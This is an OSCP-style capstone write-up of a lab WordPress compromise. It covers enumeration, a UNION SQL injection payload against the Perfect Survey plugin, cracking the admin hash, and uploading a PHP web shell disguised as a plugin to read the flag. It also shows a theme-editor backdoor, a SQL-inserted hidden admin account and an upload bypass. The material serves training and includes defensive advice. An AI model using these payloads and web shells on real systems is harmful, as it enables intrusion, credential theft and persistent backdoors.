# OSCP Chapter 10 Capstone 1 - Complete Educational Writeup

**Target:** alvida-eatery.org (192.168.229.47)
**Date:** 2025-09-30
**Final Flag:** `OS{b5c1d61eb3f29a0ffec8dcb546f4b1a1}`
**Attack Chain:** SQLi → Hash Crack → Admin Access → RCE → Flag

---

## 🎯 Learning Objectives

By studying this capstone, you will learn:
- **Enumeration persistence** - How to dig deeper when initial scans show minimal attack surface
- **Virtual host discovery** - Why domain names in content matter
- **CVE research methodology** - Finding working exploits when public PoCs fail
- **SQL injection mastery** - UNION-based attacks with exact column matching
- **Tool limitation awareness** - When automated tools fail, manual testing succeeds
- **Post-authentication exploitation** - Multiple paths from admin to RCE
- **OSCP exam mindset** - Time management and methodology

---

## 📚 Phase 1: Initial Enumeration - The Foundation

### The Power of Full Port Scans

**Command Used:**
```bash
nmap -p- --min-rate 1000 -T4 192.168.229.47 -oN quick_scan.txt
```

**Educational Commentary:**
- `-p-` scans ALL 65535 ports vs default top 1000
- `--min-rate 1000` forces minimum packet rate (60 sec scan vs 20+ minutes)
- `-T4` aggressive timing for lab environments (avoid on production)
- **Why this matters:** Many CTFs hide services on high ports. OSCP doesn't typically do this, but thoroughness is key.

**Result:** Only ports 22 (SSH) and 80 (HTTP) found - minimal attack surface

### Service Fingerprinting - Beyond Port Numbers

**Command Used:**
```bash
nmap -p 22,80 -sV -sC -A 192.168.229.47 -oA detailed_scan
```

**Educational Commentary:**
- `-sV` probes for VERSION banners (critical for CVE matching)
- `-sC` runs DEFAULT NSE scripts (often finds hidden info)
- `-A` enables OS detection + traceroute (know your target OS)
- **Teaching moment:** Version numbers are gold. OpenSSH 8.9p1 = latest/patched. Apache 2.4.52 = check for CVEs.

### The Virtual Host Discovery Breakthrough

**Initial web check:**
```bash
curl http://192.168.229.47
```
Result: Static "Alvida Coffee" template site

**The critical observation:**
In the HTML source, found: `<a href="http://alvida-eatery.org">`

**The game-changing test:**
```bash
curl -H "Host: alvida-eatery.org" http://192.168.229.47
```
Result: **COMPLETELY DIFFERENT WEBSITE** (WordPress!)

**🔑 KEY LESSON:** Apache uses virtual hosts to serve different sites on same IP based on the Host header. ALWAYS test domain names found in content as potential vhosts.

### WordPress Enumeration - The Right Tool for the Job

**Command Used:**
```bash
wpscan --url http://alvida-eatery.org --enumerate u,vp,vt --plugins-detection aggressive
```

**Flag Breakdown:**
- `--enumerate u`: Users (finds 'admin' via RSS/author enumeration)
- `--enumerate vp`: Vulnerable plugins (checks against WPScan DB)
- `--enumerate vt`: Vulnerable themes (checks known theme CVEs)
- `--plugins-detection aggressive`: Checks 7000+ plugin paths (vs 1000 in mixed mode)

**Critical Findings:**
```
[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24)
[+] perfect-survey (1.5.1) - Multiple SQLi vulnerabilities
[+] ocean-extra (2.0.1) - Potential RCE vulnerability
[+] XML-RPC enabled - Password attack vector
[+] User found: admin
```

---

## ❌ Phase 2: Learning from Failures - Why Not Everything Works

### Failure 1: Ocean-Extra RCE (CVE-2025-3472)

**What we tried:**
```bash
# Attempted shortcode execution
curl "http://alvida-eatery.org/?test=[oceanwp_current_user]"
```

**Why it failed:**
The vulnerability description states: "when WooCommerce is also installed and activated"

**Verification:**
```bash
curl -I "http://alvida-eatery.org/shop/"   # 404 - WooCommerce not installed
curl -I "http://alvida-eatery.org/cart/"   # 404 - No e-commerce functionality
```

**🎓 LESSON:** Always verify prerequisites. A vulnerable version doesn't mean exploitable in that environment.

### Failure 2: Perfect Survey SQLi with SQLMap

**Initial attempt:**
```bash
sqlmap -u "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1*" --batch
```

**The problem:**
```
[CRITICAL] page not found (404)
[WARNING] HTTP error codes detected during run: 404 (Not Found)
```

**The paradox:**
- Endpoint returns HTTP 404 status
- BUT also returns valid JSON: `{"question_id":"1","html":""}`
- SQLMap sees 404 and aborts (rigid logic)

**🎓 LESSON:** HTTP status codes can be misleading. A 404 doesn't mean the endpoint doesn't exist or isn't processing input.

---

## 💡 Phase 3: The Breakthrough - GitHub Research

### But First: How Would You Find the AJAX Endpoint Manually?

**🔍 CRITICAL SKILL: Discovering WordPress AJAX Endpoints Without Exploits**

This is what many tutorials skip - how do you FIND `/wp-admin/admin-ajax.php?action=get_question` in the first place?

#### Method 1: Plugin Source Code Analysis

**Step 1: Download the plugin files**
```bash
# Check if directory listing is enabled
curl -s "http://alvida-eatery.org/wp-content/plugins/perfect-survey/"

# If not, try common files
curl -s "http://alvida-eatery.org/wp-content/plugins/perfect-survey/perfect-survey.php"
curl -s "http://alvida-eatery.org/wp-content/plugins/perfect-survey/readme.txt"
```

**Step 2: Search for AJAX handlers in JavaScript**
```bash
# Look for JavaScript files that make AJAX calls
curl -s "http://alvida-eatery.org/" | grep -oP 'src="[^"]*perfect-survey[^"]*\.js"'

# Download and examine the JS files
curl -s "http://alvida-eatery.org/wp-content/plugins/perfect-survey/assets/js/script.js" | grep -E "ajax|action"
```

**What you'd find in the JavaScript:**
```javascript
// From perfect-survey/assets/js/script.js
jQuery.ajax({
    url: ajaxurl,
    type: 'POST',
    data: {
        'action': 'get_question',
        'question_id': questionId
    }
});
```

#### Method 2: Browser Developer Tools

**Step 1: Load a page with the survey**
```bash
# Find pages that might have surveys
curl -s "http://alvida-eatery.org/" | grep -i survey
```

**Step 2: Monitor Network tab in browser**
- Open Developer Tools (F12)
- Go to Network tab
- Interact with any survey elements
- Watch for requests to `admin-ajax.php`

**What you'd see:**
```
Request URL: http://alvida-eatery.org/wp-admin/admin-ajax.php
Request Method: POST
Form Data:
  action: get_question
  question_id: 1
```

#### Method 3: WordPress AJAX Convention Knowledge

**WordPress AJAX Standard:**
- All AJAX requests go through `/wp-admin/admin-ajax.php`
- Action parameter determines which handler runs
- Pattern: `action=plugin_name_function`

**Common plugin AJAX actions to test:**
```bash
# Perfect Survey probable actions
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" -d "action=ps_get_question"
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" -d "action=perfect_survey_get"
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" -d "action=get_question"  # This works!
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" -d "action=save_answer"
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" -d "action=get_survey"
```

#### Method 4: Fuzzing for AJAX Actions

**Create a wordlist of common AJAX actions:**
```bash
cat > ajax_actions.txt << 'EOF'
get_question
get_questions
get_survey
load_survey
save_answer
save_response
submit_survey
ps_get_question
perfect_survey_load
EOF

# Fuzz for valid actions
for action in $(cat ajax_actions.txt); do
    response=$(curl -s -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" -d "action=$action")
    if [[ ! "$response" == "0" ]]; then
        echo "Found valid action: $action"
        echo "Response: $response"
    fi
done
```

#### Method 5: PHP Source Code Patterns

**If you had file read access, you'd look for:**
```php
// WordPress AJAX hook pattern
add_action('wp_ajax_get_question', 'handle_get_question');
add_action('wp_ajax_nopriv_get_question', 'handle_get_question'); // nopriv = unauthenticated

// The vulnerable function
function handle_get_question() {
    $question_id = $_REQUEST['question_id']; // Unsanitized input!
    $sql = "SELECT * FROM questions WHERE id = $question_id"; // Direct concatenation = SQLi
}
```

**🎓 KEY LESSON:** The `wp_ajax_nopriv_` prefix means the action is accessible without authentication - these are prime targets!

### Complete Manual Discovery Summary

**THE FULL PATH FROM ZERO TO EXPLOIT:**

1. **Identify the plugin** → WPScan shows "perfect-survey 1.5.1"
2. **Check for plugin activity** → View page source, find plugin assets loaded
3. **Locate AJAX calls** → Search JS files for "ajax" or check Network tab
4. **Find the endpoint** → WordPress standard: `/wp-admin/admin-ajax.php`
5. **Discover the action** → From JS: `action=get_question`
6. **Identify parameters** → From JS: `question_id`
7. **Test for SQLi** → Add quotes, AND statements, ORDER BY
8. **Determine columns** → ORDER BY testing shows 16 columns
9. **Find display column** → Column 4 appears in output
10. **Extract data** → Craft UNION SELECT with wp_users table

**What if you had NOTHING (no CVE, no exploit)?**

```bash
# Step 1: Find all plugin AJAX actions (brute force)
for action in $(curl -s "http://alvida-eatery.org/" | grep -oP "action['\"]:\s*['\"]([^'\"]+)" | cut -d'"' -f3 | sort -u); do
    echo "Testing action: $action"
    curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" -d "action=$action"
done

# Step 2: For each valid action, fuzz parameters
common_params="id,user_id,post_id,survey_id,question_id,answer_id,data,value,content"
for param in ${common_params//,/ }; do
    curl -X POST "URL" -d "action=get_question&$param=1'"
done

# Step 3: When you find SQLi, enumerate the database
# This is exactly what we did - but discovered manually!
```

### Why ExploitDB Wasn't Enough

**ExploitDB script (50766.py) showed:**
```python
# Basic SQLi but no exact payload structure
payload = "1' OR '1'='1"
```

### The Metasploit Module Discovery

**Research path:**
1. Searched GitHub: `CVE-2021-24762 site:github.com`
2. Found: `rapid7/metasploit-framework/modules/auxiliary/scanner/http/wp_perfect_survey_sqli.rb`
3. Analyzed source code

**The Golden Discovery:**
```ruby
def run_sqli(payload)
  sqli = "1 union select 1,1,char(116,101,120,116),(#{payload}),0,0,0,null,null,null,null,null,null,null,null,null from wp_users"

  params = {
    'action' => 'get_question',
    'question_id' => sqli
  }
end
```

**Critical insights gained:**
1. Need EXACTLY 16 columns in UNION
2. Use `char(116,101,120,116)` to encode 'text'
3. Pad with nulls to match column count
4. Data extracted from specific HTML class in response

**🎓 LESSON:** Don't just look for exploits - READ THE CODE. Understanding implementation is more valuable than copy-pasting.

---

## 🎯 Phase 4: SQL Injection Mastery - Precision Exploitation

### But First: How to Identify the Vulnerable Parameter

**🔍 DISCOVERING PARAMETER NAMES AND TESTING FOR SQLi**

Once you've found the AJAX endpoint, how do you know `question_id` is vulnerable?

#### Step 1: Enumerate Parameters

**Check the plugin's JavaScript for parameter names:**
```bash
# Download the JS file
curl -s "http://alvida-eatery.org/wp-content/plugins/perfect-survey/assets/js/script.js" > ps_script.js

# Look for AJAX calls and their parameters
grep -A5 -B5 "ajax\|\.post\|\.get" ps_script.js
```

**Common parameter patterns in survey plugins:**
- `question_id`, `survey_id`, `answer_id` (numeric IDs)
- `question`, `response`, `data` (text input)
- `user_id`, `session_id` (identifiers)

#### Step 2: Test Each Parameter for SQLi

**Basic SQLi detection:**
```bash
# Test 1: Add a quote - look for errors
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" \
  -d "action=get_question&question_id=1'"

# Test 2: Boolean-based - true condition
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" \
  -d "action=get_question&question_id=1 AND 1=1"

# Test 3: Boolean-based - false condition
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" \
  -d "action=get_question&question_id=1 AND 1=2"

# Test 4: Time-based blind
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" \
  -d "action=get_question&question_id=1 AND SLEEP(5)"
```

**What indicates SQLi vulnerability:**
- Error messages mentioning SQL
- Different responses for true/false conditions
- Time delays with SLEEP()
- Success with comment injection: `1--` or `1#`

#### Step 3: Determine the SQL Query Structure

**Union-based detection - find column count:**
```bash
# Start with 1 column and increment
curl -s "URL?action=get_question&question_id=1 order by 1"  # Works
curl -s "URL?action=get_question&question_id=1 order by 2"  # Works
curl -s "URL?action=get_question&question_id=1 order by 3"  # Works
...
curl -s "URL?action=get_question&question_id=1 order by 16" # Works
curl -s "URL?action=get_question&question_id=1 order by 17" # Error!
# Conclusion: Original query has 16 columns
```

**Test UNION SELECT:**
```bash
# Try with discovered column count
curl -s "URL?action=get_question&question_id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"

# If that fails, try with NULL values
curl -s "URL?action=get_question&question_id=1 union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null"
```

#### Step 4: Identify Display Columns

**Find which columns appear in output:**
```bash
# Use unique markers
curl -s "URL?action=get_question&question_id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"

# Look for the numbers in response
# In Perfect Survey, column 4 is displayed in the question text
```

**🎓 LESSON:** Not all columns are displayed. You must identify which columns appear in the HTML response to extract data.

### Constructing the Perfect Payload

**The working exploit:**
```bash
curl -s "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201,1,char(116,101,120,116),user_pass,0,0,0,null,null,null,null,null,null,null,null,null%20from%20wp_users"
```

**Payload anatomy:**
```sql
1 union select
  1,                      -- Column 1: Static value
  1,                      -- Column 2: Static value
  char(116,101,120,116),  -- Column 3: 'text' encoded (116='t', 101='e', 120='x', 116='t')
  user_pass,              -- Column 4: Our extraction target
  0,0,0,                  -- Columns 5-7: Numeric padding
  null,null,null,         -- Columns 8-16: NULL padding
  null,null,null,
  null,null,null
from wp_users
```

**Why char() encoding?**
- Bypasses some WAF filters
- Sets question type to 'text' in application logic
- Ensures proper rendering in response

### Data Extraction Techniques

**System information gathering:**
```sql
-- Database name
1 union select 1,1,char(116,101,120,116),database(),0,0,0,null,null,null,null,null,null,null,null,null from wp_users
-- Result: wordpress

-- MySQL version
1 union select 1,1,char(116,101,120,116),version(),0,0,0,null,null,null,null,null,null,null,null,null from wp_users
-- Result: 8.0.30-0ubuntu0.22.04.1

-- Current user
1 union select 1,1,char(116,101,120,116),user(),0,0,0,null,null,null,null,null,null,null,null,null from wp_users
-- Result: dbadmin@localhost
```

**Advanced extraction with group_concat():**
```sql
-- Get ALL table names in one query
1 union select 1,1,char(116,101,120,116),group_concat(table_name),0,0,0,null,null,null,null,null,null,null,null,null from information_schema.tables where table_schema=database()
```

**🎓 LESSON:**
- Start with system info to understand the environment
- Use group_concat() to extract multiple rows
- information_schema is your database map
- Always match exact column count in UNION

### Response Parsing - Finding the Data

**The JSON response structure:**
```json
{
  "question_id": "1 union select...",
  "html": "<div>...<p class=\"survey_question_p\">EXTRACTED_DATA_HERE</p>...</div>"
}
```

**Extraction method:**
```bash
curl -s "URL" | python3 -c "import sys, json, re; data=json.load(sys.stdin); match=re.search(r'survey_question_p\">([^<]+)', data['html']); print(match.group(1))"
```

**Credentials extracted:**
- Username: `admin`
- Email: `admin@offsec-lab.com`
- Password Hash: `$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0`

---

## 🔓 Phase 5: Password Cracking - Offline Attack Strategy

### Hash Identification

**The hash:** `$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0`

**Identification process:**
- `$P$` prefix = WordPress phpass format
- Based on bcrypt with 8192 iterations
- Hashcat mode: 400
- John format: phpass

### Efficient Cracking with Hashcat

**Command with session management:**
```bash
hashcat -m 400 -a 0 /tmp/admin_hash.txt /usr/share/wordlists/rockyou.txt \
  --session oscp_wp_crack \
  --status --status-timer=60 \
  --outfile /home/kali/OSCP/capstones/chapter_10_capstone_1/cracked_password.txt \
  --outfile-format=2
```

**Flag explanations:**
- `-m 400`: WordPress (phpass) mode
- `-a 0`: Straight wordlist attack
- `--session oscp_wp_crack`: Named checkpoint for resume
- `--status-timer=60`: Progress update every minute
- `--outfile-format=2`: Plain text output

**Resume after interruption:**
```bash
hashcat --session oscp_wp_crack --restore
```

**Result:** Password cracked: `hulabaloo`

**🎓 LESSON:**
- Always use session management for long attacks
- phpass is intentionally slow (security feature)
- rockyou.txt remains highly effective
- Consider rules and masks for complex passwords

---

## 🎯 Phase 6: From Admin Access to RCE - Multiple Paths

### WordPress Authentication & Cookie Management

**Login with cookies:**
```bash
curl -s -c /tmp/wp_cookies.txt -b /tmp/wp_cookies.txt \
  -d "log=admin&pwd=hulabaloo&wp-submit=Log+In" \
  "http://alvida-eatery.org/wp-login.php"
```

**Cookie flags explained:**
- `-c /tmp/wp_cookies.txt`: Write cookies to file
- `-b /tmp/wp_cookies.txt`: Read cookies from file
- Both needed for session persistence

### Creating the Malicious Plugin

**Plugin code (/tmp/oscp-shell.php):**
```php
<?php
/*
Plugin Name: OSCP Security Scanner
Plugin URI: http://example.com
Description: Security scanning utility
Version: 1.0
Author: Security Team
*/

if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

**Why a plugin?**
- Clean and reversible
- Survives theme changes
- Easy to activate/deactivate
- Less suspicious than modified core files

**Package as ZIP:**
```bash
cd /tmp && zip oscp-shell.zip oscp-shell.php
```

### Deep Dive: Understanding WordPress Nonces

**🔐 What is a WordPress Nonce?**

A WordPress "nonce" (Number used ONCE) is actually a CSRF token that protects against Cross-Site Request Forgery attacks. Despite the name, WordPress nonces can be used multiple times within a 12-24 hour window.

**Why WordPress Requires Nonces:**
- Prevents malicious sites from tricking admins into performing actions
- Validates that requests come from the actual WordPress admin interface
- Ties actions to specific user sessions

### Plugin Upload Process - Complete Technical Breakdown

#### Step 1: Understanding the Upload Form

**First, examine the legitimate upload form:**
```bash
curl -s -b /tmp/wp_cookies.txt "http://alvida-eatery.org/wp-admin/plugin-install.php?tab=upload" | grep -A10 -B10 "upload-plugin"
```

**What you'll find in the HTML:**
```html
<form method="post" enctype="multipart/form-data" class="wp-upload-form" action="update.php?action=upload-plugin">
    <input type="hidden" id="_wpnonce" name="_wpnonce" value="e1d4414b83" />
    <input type="hidden" name="_wp_http_referer" value="/wp-admin/plugin-install.php?tab=upload" />
    <input type="file" id="pluginzip" name="pluginzip" accept=".zip" />
    <input type="submit" name="install-plugin-submit" id="install-plugin-submit" class="button" value="Install Now" />
</form>
```

#### Step 2: Extracting the Nonce - Multiple Methods

**Method 1: Direct grep extraction**
```bash
# Look for _wpnonce in the form
nonce=$(curl -s -b /tmp/wp_cookies.txt "http://alvida-eatery.org/wp-admin/plugin-install.php?tab=upload" | grep -oP '_wpnonce" value="\K[^"]+' | head -1)
echo "Nonce found: $nonce"
```

**Method 2: Using sed for extraction**
```bash
# Alternative extraction method
nonce=$(curl -s -b /tmp/wp_cookies.txt "http://alvida-eatery.org/wp-admin/plugin-install.php?tab=upload" | sed -n 's/.*_wpnonce" value="\([^"]*\).*/\1/p' | head -1)
```

**Method 3: If the page structure is different**
```bash
# Look for nonce in JavaScript
nonce=$(curl -s -b /tmp/wp_cookies.txt "http://alvida-eatery.org/wp-admin/plugin-install.php?tab=upload" | grep -oP "wpApiSettings.*?nonce['\"]:['\"]([^'\"]+)" | cut -d'"' -f3)
```

**🎓 LESSON:** WordPress nonces appear in multiple places:
- Hidden form fields (`<input name="_wpnonce">`)
- JavaScript variables (`wpApiSettings.nonce`)
- AJAX headers (`X-WP-Nonce`)
- URL parameters (`&_wpnonce=`)

#### Step 3: Constructing the Multipart Upload Payload

**The complete upload request explained:**
```bash
curl -s -b /tmp/wp_cookies.txt \
  -F "pluginzip=@/tmp/oscp-shell.zip" \
  -F "_wpnonce=e1d4414b83" \
  -F "_wp_http_referer=/wp-admin/plugin-install.php?tab=upload" \
  -F "install-plugin-submit=Install Now" \
  "http://alvida-eatery.org/wp-admin/update.php?action=upload-plugin"
```

**Breaking down each parameter:**

**`-F "pluginzip=@/tmp/oscp-shell.zip"`**
- `-F`: Creates multipart/form-data (required for file uploads)
- `pluginzip`: The form field name WordPress expects
- `@`: Tells curl to read file contents, not just the filename
- WordPress validates: Must be a valid ZIP file

**`-F "_wpnonce=e1d4414b83"`**
- The CSRF token we extracted
- WordPress validates: Must match user session
- Changes every 12-24 hours
- Required for ALL admin actions

**`-F "_wp_http_referer=/wp-admin/plugin-install.php?tab=upload"`**
- WordPress checks where the request originated
- Must match expected admin page
- Additional CSRF protection layer

**`-F "install-plugin-submit=Install Now"`**
- The submit button value
- WordPress checks this to confirm form submission
- Must match exactly what the button says

**What happens behind the scenes:**
```
POST /wp-admin/update.php?action=upload-plugin HTTP/1.1
Host: alvida-eatery.org
Cookie: wordpress_logged_in_xxx=...
Content-Type: multipart/form-data; boundary=------------------------abc123

--------------------------abc123
Content-Disposition: form-data; name="pluginzip"; filename="oscp-shell.zip"
Content-Type: application/zip

[ZIP FILE BINARY DATA]
--------------------------abc123
Content-Disposition: form-data; name="_wpnonce"

e1d4414b83
--------------------------abc123
Content-Disposition: form-data; name="_wp_http_referer"

/wp-admin/plugin-install.php?tab=upload
--------------------------abc123--
```

#### Step 4: Handling Upload Errors

**Common errors and solutions:**

**"Are you sure you want to do this?"**
```bash
# This means nonce is invalid or expired
# Solution: Re-fetch the nonce
nonce=$(curl -s -b /tmp/wp_cookies.txt "http://alvida-eatery.org/wp-admin/plugin-install.php?tab=upload" | grep -oP '_wpnonce" value="\K[^"]+' | head -1)
```

**"The uploaded file is not a valid plugin"**
```bash
# ZIP structure is wrong
# WordPress expects: plugin-name/plugin-name.php
# Fix: Create proper structure
mkdir oscp-shell
mv oscp-shell.php oscp-shell/
zip -r oscp-shell.zip oscp-shell/
```

**"Sorry, you are not allowed to upload plugins"**
```bash
# Permissions issue - verify admin access
curl -s -b /tmp/wp_cookies.txt "http://alvida-eatery.org/wp-admin/" | grep -o "Howdy, admin"
```

#### Step 5: Plugin Activation - Another Nonce Challenge

**Finding the activation nonce:**
```bash
# After upload, get the plugins page
curl -s -b /tmp/wp_cookies.txt "http://alvida-eatery.org/wp-admin/plugins.php" > plugins_page.html

# Find our plugin's activation link
activation_link=$(grep -oP "activate.*?oscp-shell.*?_wpnonce=\K[^'\"&]+" plugins_page.html | head -1)
echo "Activation nonce: $activation_link"

# Extract the full activation URL
activate_url=$(grep -oP "plugins\.php\?action=activate[^'\"]+oscp-shell[^'\"]+_wpnonce=[^'\"&]+" plugins_page.html | head -1)
```

**The activation request:**
```bash
curl -s -b /tmp/wp_cookies.txt "http://alvida-eatery.org/wp-admin/$activate_url"
```

**Alternative: Direct database activation (if you have SQLi)**
```sql
-- Add to active_plugins option
UPDATE wp_options
SET option_value = 'a:2:{i:0;s:23:"oscp-shell/oscp-shell.php";i:1;s:27:"akismet/akismet.php";}'
WHERE option_name = 'active_plugins';
```

#### Troubleshooting Nonce Issues

**If nonces keep failing:**

**Option 1: Use browser automation**
```python
# Python with requests + session
import requests
from bs4 import BeautifulSoup

session = requests.Session()
session.post('http://alvida-eatery.org/wp-login.php',
    data={'log': 'admin', 'pwd': 'hulabaloo'})

# Get upload page with fresh nonce
upload_page = session.get('http://alvida-eatery.org/wp-admin/plugin-install.php?tab=upload')
soup = BeautifulSoup(upload_page.text, 'html.parser')
nonce = soup.find('input', {'name': '_wpnonce'})['value']

# Upload with valid session nonce
files = {'pluginzip': open('/tmp/oscp-shell.zip', 'rb')}
data = {
    '_wpnonce': nonce,
    '_wp_http_referer': '/wp-admin/plugin-install.php?tab=upload',
    'install-plugin-submit': 'Install Now'
}
session.post('http://alvida-eatery.org/wp-admin/update.php?action=upload-plugin',
    files=files, data=data)
```

**Option 2: Theme editor (no upload needed)**
```bash
# Edit theme file directly - no file upload nonce needed
curl -s -b /tmp/wp_cookies.txt "http://alvida-eatery.org/wp-admin/theme-editor.php?file=404.php" | grep -oP '_wpnonce" value="\K[^"]+'

# Add backdoor to 404.php
curl -s -b /tmp/wp_cookies.txt -X POST "http://alvida-eatery.org/wp-admin/theme-editor.php" \
  -d "nonce=NONCE&_wp_http_referer=/wp-admin/theme-editor.php&newcontent=<?php system($_GET['cmd']); ?>&action=update&file=404.php&theme=oceanwp"
```

**🎓 KEY LESSON:** WordPress nonces are session-specific and time-limited. Always extract fresh nonces immediately before use, and understand that they're tied to:
- The logged-in user
- The specific action being performed
- A time window (12-24 hours)
- The WordPress installation's secret keys

### RCE Confirmation

**Test command execution:**
```bash
curl -s "http://alvida-eatery.org/wp-content/plugins/oscp-shell/oscp-shell.php?cmd=id"
```

**Output:**
```
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

**🎓 LESSON:**
- WordPress plugins execute with web server privileges
- Direct access to plugin files bypasses WordPress security
- Always test with safe commands first (id, whoami, pwd)

---

## 🏴 Phase 7: Flag Retrieval - Systematic Search

### Filesystem Search Strategy

**Step 1: Search for common flag patterns:**
```bash
curl -s "http://alvida-eatery.org/wp-content/plugins/oscp-shell/oscp-shell.php?cmd=grep+-r+'OS{'+/var/www/html+2>/dev/null"
```
Result: No flag in web directory

**Step 2: Look for flag files:**
```bash
curl -s "http://alvida-eatery.org/wp-content/plugins/oscp-shell/oscp-shell.php?cmd=find+/var/www+-name+'*flag*'+2>/dev/null"
```

**Output:**
```
/var/www/flag.txt
/var/www/wordpress/wp-includes/images/icon-pointer-flag.png
/var/www/wordpress/wp-includes/images/icon-pointer-flag-2x.png
```

**Step 3: Retrieve the flag:**
```bash
curl -s "http://alvida-eatery.org/wp-content/plugins/oscp-shell/oscp-shell.php?cmd=cat+/var/www/flag.txt"
```

**Flag captured:** `OS{b5c1d61eb3f29a0ffec8dcb546f4b1a1}`

**🎓 LESSON:**
- Flags can be in filesystem OR database
- Use find and grep systematically
- Check parent directories of web root
- Document EXACT location for report

---

## 🛠️ Complete Command Reference

### Enumeration Commands

```bash
# Full TCP port scan with speed optimization
nmap -p- --min-rate 1000 -T4 192.168.229.47 -oN all_ports.txt
# Why: Discovers all services, not just common ports

# Service version detection on discovered ports
nmap -p 22,80 -sV -sC -A 192.168.229.47 -oA service_scan
# Why: Version numbers enable CVE research

# Virtual host discovery
curl -H "Host: alvida-eatery.org" http://192.168.229.47
# Why: Same IP can host multiple sites

# WordPress enumeration
wpscan --url http://alvida-eatery.org --enumerate u,vp,vt --plugins-detection aggressive
# Why: Specialized tool finds WordPress-specific vulnerabilities
```

### Exploitation Commands

```bash
# Working SQLi payload for password hash
curl -s "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201,1,char(116,101,120,116),user_pass,0,0,0,null,null,null,null,null,null,null,null,null%20from%20wp_users"

# Extract and parse in one command
curl -s "URL" | grep -oP 'survey_question_p">\K[^<]+'

# Crack WordPress hash with session management
hashcat -m 400 hash.txt rockyou.txt --session crack1 --status

# Authenticated plugin upload
curl -b cookies.txt -F "pluginzip=@plugin.zip" -F "_wpnonce=NONCE" "http://site/wp-admin/update.php?action=upload-plugin"
```

### Post-Exploitation Commands

```bash
# System reconnaissance
id && hostname && pwd && uname -a

# Find SUID binaries for privilege escalation
find / -perm -4000 -type f 2>/dev/null

# Search for flags
find / -name "*flag*" -o -name "*proof*" 2>/dev/null
grep -r "OS{" /var/www/ 2>/dev/null
```

---

## 🎮 Alternative Approaches Not Used

### Method 1: Theme Editor Backdoor
```php
// Add to functions.php via Appearance > Theme Editor
if(isset($_REQUEST['backdoor'])) {
    system($_REQUEST['backdoor']);
    exit;
}
```
**Pros:** No file upload needed
**Cons:** Modifies existing files, harder to clean up

### Method 2: Media Upload Bypass
```bash
# Upload PHP with image extension
mv shell.php shell.php.jpg
# Then access directly if .htaccess misconfigured
```
**Pros:** Simple upload process
**Cons:** Often blocked by MIME type checks

### Method 3: Backup Admin Account
```sql
-- Via SQLi, create new admin
INSERT INTO wp_users (user_login, user_pass, user_email) VALUES ('backdoor', MD5('password'), 'back@door.com');
INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (2, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
```
**Pros:** Persistent access
**Cons:** Visible in user list

---

## 🛡️ Defensive Recommendations

### How This Attack Could Be Prevented

1. **Update plugins immediately**
   ```bash
   wp plugin update perfect-survey
   ```

2. **Disable XML-RPC if unused**
   ```apache
   <Files xmlrpc.php>
   Order Deny,Allow
   Deny from all
   </Files>
   ```

3. **Implement rate limiting**
   ```bash
   # Fail2ban rule for wp-login and xmlrpc
   failregex = ^<HOST> .* "POST /wp-login.php
               ^<HOST> .* "POST /xmlrpc.php
   ```

4. **Use strong passwords**
   - Minimum 14 characters
   - Include symbols and numbers
   - Avoid dictionary words

5. **Web Application Firewall**
   - Blocks common SQLi patterns
   - Rate limits aggressive scanning
   - Alerts on exploitation attempts

---

## 🎯 OSCP Exam Relevance

### Time Management Strategy

| Phase | Time Allocation | Key Actions |
|-------|----------------|-------------|
| Enumeration | 1-2 hours | Full port scan, service detection, technology identification |
| Vulnerability Research | 30-60 min | CVE lookup, PoC search, Metasploit modules |
| Exploitation | 1-2 hours | Test exploits, adapt payloads, achieve initial access |
| Privilege Escalation | 1-2 hours | Enumerate system, find privesc vector, get root |
| Documentation | Throughout | Screenshot everything, note commands, explain methodology |

### Methodology Checklist

- [ ] Full port scan completed
- [ ] All services version detected
- [ ] Web technologies identified
- [ ] CMS/Framework enumerated
- [ ] Public exploits researched
- [ ] Manual testing performed
- [ ] Credentials obtained
- [ ] Initial shell achieved
- [ ] Privilege escalation completed
- [ ] Flags retrieved
- [ ] Report documented

---

## 💭 Key Takeaways

### Technical Lessons

1. **HTTP status codes lie** - 404 doesn't mean not vulnerable
2. **Read exploit source code** - Implementation details matter
3. **Check dependencies** - Vulnerable ≠ exploitable
4. **Manual > Automated** - When tools fail, understand why
5. **Document everything** - Commands, outputs, thought process

### Mindset Lessons

1. **Persistence pays** - Don't give up after first failure
2. **Research deeply** - GitHub/Metasploit often have answers
3. **Think like a developer** - Understand application logic
4. **Layer your tools** - Each reveals different information
5. **Time-box efforts** - Know when to pivot strategies

### OSCP-Specific Tips

1. **Start with low-hanging fruit** - Default creds, known CVEs
2. **Take breaks** - Fresh eyes spot new vectors
3. **Screenshot everything** - Evidence for report
4. **Explain your thinking** - Methodology matters
5. **Practice this process** - Make it second nature

---

## 📖 Additional Study Resources

### Practice Similar Scenarios
- TryHackMe: Blog, Internal, Daily Bugle rooms
- HackTheBox: Backdoor, Bolt, Pressed machines
- VulnHub: Mr. Robot, Stapler, PwnLab

### Deepen Your Knowledge
- WordPress Security Bible (WPScan documentation)
- OWASP Top 10 (understand web vulnerabilities)
- PayloadsAllTheThings (GitHub - exploitation techniques)
